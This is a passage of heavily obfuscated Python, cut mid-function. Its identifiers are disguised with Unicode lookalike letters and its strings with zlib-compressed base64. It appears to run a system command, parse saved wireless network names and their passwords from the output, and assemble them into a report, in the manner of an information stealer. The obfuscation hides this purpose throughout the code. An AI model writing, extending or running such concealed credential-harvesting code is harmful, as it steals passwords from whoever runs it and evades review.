                    𝘳𝗲𝘀𝙪𝗹𝘁𝘀 = [𝗯.split(__𝘪𝗺𝘱𝗼𝙧𝙩__('base64').b64decode(__𝙞𝗺𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3O\xb7\xb5\x05\x00\x03,\x011')).decode())[𝗶𝗻𝙩.from_bytes(𝙢𝙖𝘱(lambda O, i: 554 - (𝘪𝘯𝙩(𝗢) + 𝘪), 𝗺𝙖𝘱(__𝘪𝘮𝙥𝗼𝙧𝘁__('base64').b64decode(__𝗶𝗺𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝘱(*[𝘪𝘁𝘦𝙧(__𝙞𝘮𝙥𝘰𝗿𝘁__('base64').b64decode(__𝘪𝙢𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\xf3\x0b\t\xad\x02\x00\x03\\\x01r')).decode())] * 3)), 𝗿𝙖𝙣𝘨𝘦(1)), __𝗶𝗺𝘱𝙤𝙧𝘵__('base64').b64decode(__𝘪𝗺𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)][𝘪𝘯𝘁.from_bytes(𝙢𝘢𝗽(lambda O, i: 830 - (𝘪𝙣𝘵(𝙊) + 𝗶), 𝙢𝙖𝗽(__𝗶𝙢𝗽𝘰𝘳𝙩__('base64').b64decode(__𝙞𝙢𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝙞𝘁𝙚𝗿(__𝗶𝗺𝘱𝘰𝙧𝙩__('base64').b64decode(__𝗶𝙢𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf3w\xf14\x05\x00\x02\xd3\x01\x12')).decode())] * 3)), 𝘳𝙖𝙣𝙜𝘦(1)), __𝘪𝙢𝘱𝘰𝙧𝘁__('base64').b64decode(__𝘪𝙢𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):-𝘪𝘯𝘵.from_bytes(𝗺𝙖𝙥(lambda O, i: 468 - (𝘪𝗻𝘁(𝙊) + 𝙞), 𝘮𝘢𝗽(__𝘪𝙢𝗽𝗼𝘳𝙩__('base64').b64decode(__𝘪𝗺𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝗶𝙩𝗲𝙧(__𝙞𝘮𝙥𝗼𝙧𝙩__('base64').b64decode(__𝗶𝘮𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\xf3s\x894\x06\x00\x02\xed\x01\x1f')).decode())] * 3)), 𝗿𝗮𝙣𝗴𝗲(1)), __𝙞𝙢𝙥𝗼𝙧𝘁__('base64').b64decode(__𝙞𝗺𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] for 𝙗 in 𝙧𝘦𝘀𝘂𝘭𝙩𝙨 if __𝙞𝗺𝙥𝙤𝘳𝙩__('base64').b64decode(__𝘪𝗺𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x0b6\n3\xf5t\xf5+K\xca\x0b\xcaI\xca\x0b\xb4\x05\x00*\xf3\x05O')).decode() in 𝙗]
                except 𝘀𝘂𝙗𝘱𝗿𝗼𝙘𝗲𝘴𝘴.CalledProcessError:
                    𝗻𝘦𝙩𝘸𝙤𝗿𝗸𝙨.append((𝗻𝘢𝘮𝙚, __𝘪𝘮𝙥𝘰𝘳𝘁__('base64').b64decode(__𝘪𝗺𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode()))
                    continue
                try:
                    𝘯𝙚𝙩𝘸𝘰𝘳𝗸𝘀.append((𝗻𝗮𝗺𝘦, 𝘳𝗲𝙨𝙪𝙡𝙩𝘀[𝗶𝗻𝘵.from_bytes(𝗺𝙖𝙥(lambda O, i: 986 - (𝙞𝙣𝘵(𝗢) + 𝘪), 𝙢𝙖𝙥(__𝙞𝘮𝘱𝘰𝗿𝘁__('base64').b64decode(__𝘪𝘮𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝙞𝘵𝘦𝘳(__𝘪𝙢𝘱𝗼𝗿𝘁__('base64').b64decode(__𝗶𝙢𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝙣𝗴𝗲(0)), __𝗶𝙢𝙥𝗼𝙧𝘵__('base64').b64decode(__𝙞𝗺𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
                except 𝙄𝗻𝗱𝘦𝘅𝗘𝙧𝙧𝙤𝗿:
                    𝙣𝗲𝘵𝘸𝙤𝗿𝗸𝘀.append((𝗻𝗮𝙢𝘦, __𝙞𝙢𝗽𝙤𝘳𝘁__('base64').b64decode(__𝗶𝘮𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode()))
        except 𝘀𝘂𝗯𝙥𝙧𝙤𝙘𝙚𝘀𝘀.CalledProcessError:
            pass
        except 𝗨𝙣𝙞𝗰𝗼𝘥𝘦𝘿𝗲𝗰𝘰𝙙𝙚𝘌𝗿𝘳𝗼𝙧:
            pass
        𝘰𝙪𝘵 += __𝙞𝗺𝗽𝘰𝘳𝘁__('base64').b64decode(__𝙞𝗺𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK\xad\xca\xb7\xf0\xcdr\xb2Lsv2\xf7\xcf\xaa\xb0tN\xb7\xb5\x05\x00F\x82\x06i')).decode().format(__𝘪𝗺𝗽𝗼𝙧𝙩__('base64').b64decode(__𝗶𝙢𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x0b5\xf4\xf3\nr\xb4\xb5\x05\x00\n\x0f\x02,')).decode(), __𝘪𝗺𝘱𝘰𝗿𝘁__('base64').b64decode(__𝙞𝗺𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x0buu\x0b\t5L\t\x08\xcd\x0e\xb4\x05\x00\x18\n\x03\xbd')).decode())
        𝙤𝘂𝘁 += __𝘪𝘮𝗽𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xdaK56\xb4H56\xf0\x06\x00\t\xab\x02\x15')).decode().format(__𝙞𝙢𝗽𝙤𝙧𝙩__('base64').b64decode(__𝙞𝙢𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3\t\xb4\xb5\x05\x00\x02\xde\x01\x18')).decode() * 𝙞𝙣𝘁.from_bytes(𝗺𝗮𝙥(lambda O, i: 293 - (𝘪𝙣𝘵(𝘖) + 𝗶), 𝘮𝘢𝙥(__𝗶𝙢𝙥𝙤𝘳𝘵__('base64').b64decode(__𝘪𝗺𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝙥(*[𝙞𝙩𝗲𝘳(__𝙞𝘮𝘱𝘰𝙧𝘵__('base64').b64decode(__𝙞𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xda\xf3\xcdJ\xae\x02\x00\x03\xb6\x01\x95')).decode())] * 3)), 𝘳𝗮𝗻𝗴𝘦(1)), __𝙞𝗺𝘱𝘰𝙧𝙩__('base64').b64decode(__𝘪𝙢𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False), __𝙞𝘮𝙥𝘰𝙧𝙩__('base64').b64decode(__𝗶𝗺𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf3\t\xb4\xb5\x05\x00\x02\xde\x01\x18')).decode() * 𝘪𝘯𝙩.from_bytes(𝙢𝘢𝗽(lambda O, i: 644 - (𝘪𝙣𝘵(𝘖) + 𝙞), 𝙢𝗮𝘱(__𝙞𝙢𝘱𝗼𝗿𝘁__('base64').b64decode(__𝘪𝗺𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝘱(*[𝙞𝘵𝗲𝘳(__𝘪𝘮𝙥𝘰𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3\xcbr5\x04\x00\x035\x01/')).decode())] * 3)), 𝗿𝘢𝘯𝘨𝘦(1)), __𝘪𝗺𝘱𝙤𝘳𝘁__('base64').b64decode(__𝘪𝗺𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))
        for (𝙣𝗮𝙢𝗲, 𝘱𝗮𝘴𝙨𝘄𝙤𝘳𝙙) in 𝗻𝗲𝙩𝙬𝗼𝘳𝙠𝙨:
            𝙤𝘂𝘁 += __𝙞𝘮𝘱𝙤𝘳𝘵__('base64').b64decode(__𝘪𝘮𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xdaK\xad\xca\xb7\xf0\xcdr\xb2Lsv2\xf7\xcf\xaa\xb0tN\xb7\xb5\x05\x00F\x82\x06i')).decode().format(𝘯𝘢𝗺𝘦, 𝙥𝘢𝙨𝘀𝘄𝗼𝙧𝙙)
        return (__𝘪𝗺𝗽𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xcf\xf3+\x8822\xcdHr\xb3\xacJ\xf1\xf0\xcaI\xcaM1Ht\xc9O\x0f3\xcaqO\x0c\xb4\xb5\x05\x00\xb2\xb7\n\xa7')).decode(), __𝘪𝙢𝙥𝘰𝙧𝘁__('base64').b64decode(__𝘪𝘮𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x8btwJO56L\x8ftw\xb4\x05\x00\x18&\x03\x98')).decode().format(𝘰𝘂𝙩), False)